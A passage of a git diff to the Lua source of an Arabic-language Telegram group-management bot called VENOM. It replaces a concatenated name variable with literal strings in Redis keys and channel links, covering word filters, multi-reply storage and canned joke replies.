-local tsssst = database:get(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local tsssst = database:get(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if tsssst == "rep" then   
 send(msg.chat_id_, msg.id_," 𖥔 ارسل التحذير عند ارسال الكلمه")  
-database:set(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
-database:set(bot_id..""..VENOM.."1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
-database:sadd(bot_id..""..VENOM.."1:List:Filter"..msg.chat_id_,text)  
+database:set(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
+database:set(bot_id.."VENOM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
+database:sadd(bot_id.."VENOM1:List:Filter"..msg.chat_id_,text)  
 return false  end  
 end
 if text then  
-local test = database:get(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = database:get(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if test == "repp" then  
 send(msg.chat_id_, msg.id_," 𖥔 تم منع الكلمه مع التحذير")  
-database:del(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-local test = database:get(bot_id..""..VENOM.."1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
+database:del(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = database:get(bot_id.."VENOM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
 if text then   
-database:set(bot_id..""..VENOM.."1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
+database:set(bot_id.."VENOM1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
 end  
-database:del(bot_id..""..VENOM.."1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
+database:del(bot_id.."VENOM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
 return false  end  
 end
 
 if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
 send(msg.chat_id_, msg.id_," 𖥔 ارسل الكلمه الان")  
-database:set(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
+database:set(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
 return false  end
 if text then 
-local test = database:get(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+local test = database:get(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
 if test and test == "reppp" then   
 send(msg.chat_id_, msg.id_," 𖥔 تم الغاء منعها")  
-database:del(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-database:del(bot_id..""..VENOM.."1:Add:Filter:Rp2"..text..msg.chat_id_)  
-database:srem(bot_id..""..VENOM.."1:List:Filter"..msg.chat_id_,text)  
+database:del(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+database:del(bot_id.."VENOM1:Add:Filter:Rp2"..text..msg.chat_id_)  
+database:srem(bot_id.."VENOM1:List:Filter"..msg.chat_id_,text)  
 return false  end  
 end
 
@@ -10924,20 +10932,20 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 
 if text == "مسح قائمه المنع"and Manager(msg) then   
-local list = database:smembers(bot_id..""..VENOM.."1:List:Filter"..msg.chat_id_)  
+local list = database:smembers(bot_id.."VENOM1:List:Filter"..msg.chat_id_)  
 for k,v in pairs(list) do  
-database:del(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
-database:del(bot_id..""..VENOM.."1:Add:Filter:Rp2"..v..msg.chat_id_)  
-database:srem(bot_id..""..VENOM.."1:List:Filter"..msg.chat_id_,v)  
+database:del(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
+database:del(bot_id.."VENOM1:Add:Filter:Rp2"..v..msg.chat_id_)  
+database:srem(bot_id.."VENOM1:List:Filter"..msg.chat_id_,v)  
 end  
 send(msg.chat_id_, msg.id_," 𖥔 تم مسح قائمه المنع")  
 end
 
 if text == "قائمه المنع" and Manager(msg) then   
-local list = database:smembers(bot_id..""..VENOM.."1:List:Filter"..msg.chat_id_)  
+local list = database:smembers(bot_id.."VENOM1:List:Filter"..msg.chat_id_)  
 t = "\n 𖥔 قائمة المنع \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
 for k,v in pairs(list) do  
-local VENOM_Msg = database:get(bot_id..""..VENOM.."1:Add:Filter:Rp2"..v..msg.chat_id_)   
+local VENOM_Msg = database:get(bot_id.."VENOM1:Add:Filter:Rp2"..v..msg.chat_id_)   
 t = t..""..k.."- "..v.." ↭ {"..VENOM_Msg.."}\n"    
 end  
 if #list == 0 then  
@@ -12116,21 +12124,21 @@ local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
 local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-if database:get(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
+if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_, '\n 𖥔 ارسل الكلمه تريد اضافتها')
-database:set(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
-database:set(bot_id.."botss:"..VENOM..":Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
-database:sadd(bot_id.."botss:"..VENOM..":List:Rd:Sudo", text)
+database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
+database:set(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
+database:sadd(bot_id.."botss:VENOM:List:Rd:Sudo", text)
 return false end
 end
 if text and text:match("^(.*)$") then
-if database:get(bot_id.."botss:"..VENOM..":Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
+if database:get(bot_id.."botss:VENOM:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_," 𖥔 تم مسح الرد من ردود المتعدده")
-database:del(bot_id..'botss:"..VENOM..":Add:Rd:Sudo:Text'..text)
-database:del(bot_id..'botss:"..VENOM..":Add:Rd:Sudo:Text1'..text)
-database:del(bot_id..'botss:"..VENOM..":Add:Rd:Sudo:Text2'..text)
-database:del(bot_id.."botss:"..VENOM..":Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
-database:srem(bot_id.."botss:"..VENOM..":List:Rd:Sudo", text)
+database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text'..text)
+database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text1'..text)
+database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text2'..text)
+database:del(bot_id.."botss:VENOM:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
+database:srem(bot_id.."botss:VENOM:List:Rd:Sudo", text)
 return false
 end
 end
@@ -12144,12 +12152,12 @@ send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n
 end
 return false
 end
-local list = database:smembers(bot_id.."botss:"..VENOM..":List:Rd:Sudo")
+local list = database:smembers(bot_id.."botss:VENOM:List:Rd:Sudo")
 for k,v in pairs(list) do  
-database:del(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text"..v) 
-database:del(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text1"..v) 
-database:del(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text2"..v)   
-database:del(bot_id.."botss:"..VENOM..":List:Rd:Sudo")
+database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text"..v) 
+database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text1"..v) 
+database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text2"..v)   
+database:del(bot_id.."botss:VENOM:List:Rd:Sudo")
 end
 send(msg.chat_id_, msg.id_," 𖥔تم مسح ردود المتعدده")
 end
@@ -12376,7 +12384,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12386,7 +12394,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/19&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12396,7 +12404,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/comxnxp/20&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12407,7 +12415,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/21&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12419,7 +12427,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/94&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12430,7 +12438,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/93&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12441,7 +12449,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/95&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12453,7 +12461,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/D_V1_D/96&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -12644,7 +12652,7 @@ send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n
 end
 return false
 end
-local list = database:smembers(bot_id.."botss:"..VENOM..":List:Rd:Sudo")
+local list = database:smembers(bot_id.."botss:VENOM:List:Rd:Sudo")
 text = "\nقائمة ردود المتعدده \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
 for k,v in pairs(list) do
 db = "رساله "
@@ -12666,7 +12674,7 @@ send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n
 end
 return false
 end
-database:set(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
+database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_," 𖥔ارسل الرد الذي اريد اضافته")
 end
 if text == "مسح رد متعدد" and CoSu(msg) then
@@ -12679,58 +12687,58 @@ send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n
 end
 return false
 end
-database:set(bot_id.."botss:"..VENOM..":Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
+database:set(bot_id.."botss:VENOM:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_," 𖥔ارسل الان الكلمه لمسحها ")
 end
 if text then  
-local test = database:get(bot_id.."botss:"..VENOM..":Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if database:get(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
-database:set(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
+local test = database:get(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
+database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-database:set(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text"..test, text)  
+database:set(bot_id.."botss:VENOM:Add:Rd:Sudo:Text"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," 𖥔تم حفظ الرد الاول ارسل الرد الثاني")
 return false  
 end  
 end
 if text then  
-local test = database:get(bot_id.."botss:"..VENOM..":Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if database:get(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
-database:set(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
+local test = database:get(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
+database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-database:set(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text1"..test, text)  
+database:set(bot_id.."botss:VENOM:Add:Rd:Sudo:Text1"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," 𖥔تم حفظ الرد الثاني ارسل الرد الثالث")
 return false  
 end  
 end
 if text then  
-local test = database:get(bot_id.."botss:"..VENOM..":Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if database:get(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
-database:set(bot_id.."botss:"..VENOM..":Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
+local test = database:get(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
+database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-database:set(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text2"..test, text)  
+database:set(bot_id.."botss:VENOM:Add:Rd:Sudo:Text2"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," 𖥔تم حفظ الرد")
 return false  
 end  
 end
 if text then
-local Text = database:get(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text"..text)   
-local Text1 = database:get(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text1"..text)   
-local Text2 = database:get(bot_id.."botss:"..VENOM..":Add:Rd:Sudo:Text2"..text)   
+local Text = database:get(bot_id.."botss:VENOM:Add:Rd:Sudo:Text"..text)   
+local Text1 = database:get(bot_id.."botss:VENOM:Add:Rd:Sudo:Text1"..text)   
+local Text2 = database:get(bot_id.."botss:VENOM:Add:Rd:Sudo:Text2"..text)   
 if Text or Text1 or Text2 then 
 local texting = {
 Text,
@@ -13013,7 +13021,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_," ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/SOURCEVENOM)')
 return false
 end
 
@@ -13023,7 +13031,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_," 𖥔معطله") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/SOURCEVENOM)')
 return false
 end
 
@@ -13036,7 +13044,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13051,7 +13059,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13081,7 +13089,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..🌚♥️](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..🌚♥️](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13107,7 +13115,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/SOURCEVENOM)')
 return false
 end
 
@@ -13120,7 +13128,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13135,7 +13143,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13150,7 +13158,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13164,7 +13172,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13179,7 +13187,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13194,7 +13202,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13208,7 +13216,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13222,7 +13230,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13236,7 +13244,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13250,7 +13258,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[انا اجمد ..🌚💕](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[انا اجمد ..🌚💕](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13264,7 +13272,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[انا اجمد ..??💕](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[انا اجمد ..??💕](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13278,7 +13286,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13292,7 +13300,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[مش بدودو ..😹👻](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[مش بدودو ..😹👻](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13306,7 +13314,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13320,7 +13328,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13334,7 +13342,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚💕](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚💕](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13348,7 +13356,7 @@ if not my_ph then
 send(msg.chat_id_, msg.id_,"  ") 
 return false  
 end
-send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚💕](t.me/SOURCE'..VENOM..')')
+send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚💕](t.me/SOURCEVENOM)')
 return false
 end
 end
@@ -13751,12 +13759,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ban.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n• 🖤 | 𝑼𝑬𝑺 : '..username..' \n• 🖤 | 𝑴𝑺𝑮 : '..Msguser..' \n• 🖤 | 𝑺𝑻𝑨 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n• 🖤 | 𝑰𝑫 :  '..msg.sender_user_id_..' \n• 🖤 | b𝐼𝑂 : '..getbioY..' \n• 🖤 | 𝐶𝐻 : @SOURCE'..VENOM..' \n')
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ban.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n• 🖤 | 𝑼𝑬𝑺 : '..username..' \n• 🖤 | 𝑴𝑺𝑮 : '..Msguser..' \n• 🖤 | 𝑺𝑻𝑨 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n• 🖤 | 𝑰𝑫 :  '..msg.sender_user_id_..' \n• 🖤 | b𝐼𝑂 : '..getbioY..' \n• 🖤 | 𝐶𝐻 : @SOURCEVENOM \n')
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
